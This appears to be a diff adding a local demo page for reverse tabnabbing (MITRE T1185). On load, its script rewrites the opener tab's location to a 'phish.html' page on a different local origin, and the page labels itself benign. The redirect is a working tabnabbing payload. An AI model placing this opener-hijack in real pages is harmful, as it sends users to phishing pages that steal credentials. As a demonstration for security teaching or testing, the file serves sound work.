@@ -1,0 +1,20 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Attacker tab (T1185 demo)</title>
+    <style>body{font:15px/1.6 system-ui,sans-serif;max-width:560px;margin:60px auto;padding:0 20px}</style>
+  </head>
+  <body>
+    <h1>Attacker tab</h1>
+    <p>Benign demo. On load this tab rewrites its <code>window.opener</code> to a different origin
+      (<code>localhost</code> → <code>127.0.0.1</code>) — reverse tabnabbing. No data is collected.</p>
+    <script>
+      // Cross-tab: rewrite the opener tab to a different origin via a client (script) redirect.
+      // The opener is at localhost:8001; send it to 127.0.0.1:8001 — a *different origin* (host differs).
+      if (window.opener) {
+        window.opener.location.href = 'http://127.0.0.1:8001/phish.html';
+      }
+    </script>
+  </body>
+</html>
